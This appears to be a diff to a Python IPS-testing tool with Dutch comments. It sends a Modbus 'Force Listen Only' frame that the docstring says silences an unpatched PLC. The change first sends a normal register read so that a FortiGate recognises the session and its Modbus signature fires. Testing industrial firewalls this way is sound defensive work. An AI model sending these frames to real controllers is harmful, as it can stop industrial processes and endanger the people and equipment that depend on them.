@@ -109,14 +109,25 @@ def cmd_modbus_write(ip, addr, value):
 
 def cmd_modbus_forcelisten(ip):
     """Modbus Force Listen Only Mode (FC08, sub-functie 0x0004): zet een
-    ongepatchte PLC stil. Conform spec stuurt de PLC hier geen antwoord op; een
-    IPS die het pakket herkent dropt of reset de sessie."""
-    frame = bytes.fromhex("000100000006010800040000")
+    ongepatchte PLC stil. Eerst een normale read op dezelfde verbinding, zodat de
+    FortiGate de sessie als Modbus herkent (anders ziet hij een onbekende app en
+    grijpt de Modbus-signature niet); daarna het Force-Listen-frame. Conform spec
+    antwoordt de PLC daar niet op; een IPS die het herkent dropt of reset de sessie."""
+    read = bytes.fromhex("000100000006010300000001")   # FC03: HR0, 1 register
+    frame = bytes.fromhex("000100000006010800040000")  # FC08: Force Listen Only
     try:
         s = socket.create_connection((ip, 502), timeout=5)
     except OSError as e:
         out(False, f"{ip}:502 niet bereikbaar - {e}")
     try:
+        # normale Modbus-uitwisseling zodat de FortiGate de sessie classificeert
+        s.sendall(read)
+        s.settimeout(3)
+        try:
+            s.recv(64)
+        except socket.timeout:
+            pass
+        # de eigenlijke aanval op dezelfde (nu als Modbus herkende) sessie
         s.sendall(frame)
         s.settimeout(3)
         try:
